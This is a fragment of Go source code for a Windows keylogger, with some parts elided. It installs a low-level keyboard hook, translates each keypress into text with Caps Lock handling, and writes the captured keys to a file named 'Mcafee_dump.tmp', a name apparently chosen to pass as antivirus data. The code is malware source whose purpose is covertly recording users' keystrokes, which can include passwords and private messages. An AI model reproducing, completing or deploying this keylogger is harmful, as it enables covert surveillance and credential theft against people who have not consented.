...
func Keylogger() {
	...
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {
		if nCode == 0 && wparam == WM_KEYDOWN {
			...
			var keyStr string
			if CAPS == 0 && CAPS2 == 0 {
				keyStr = keys_low[uint16(code)]
			} else if CAPS2 == 1 {
				keyStr = keys_high[uint16(code)]
			} else {
				keyStr = capup[uint16(code)]
			}
...
func writeToFile(content string) {
	...
	filePath := directory + "Mcafee_dump.tmp"
